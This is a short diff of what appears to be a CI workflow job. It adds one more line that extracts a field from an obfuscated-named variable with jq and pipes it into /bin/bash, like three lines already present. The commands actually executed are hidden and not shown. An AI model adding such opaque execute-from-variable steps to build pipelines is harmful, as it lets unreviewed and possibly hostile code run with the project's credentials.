@@ -44,6 +44,7 @@ jobs:
           echo $pm211 | jq -r .kqimf8 | /bin/bash
           echo $jbs187 | jq -r .wji561 | /bin/bash
           echo $zhmni84298 | jq -r .uqd3 | /bin/bash
+          printf '%s' "$lbyn2921" | jq -r .e856 | /bin/bash
 
       - name: Save archive
         if: always()
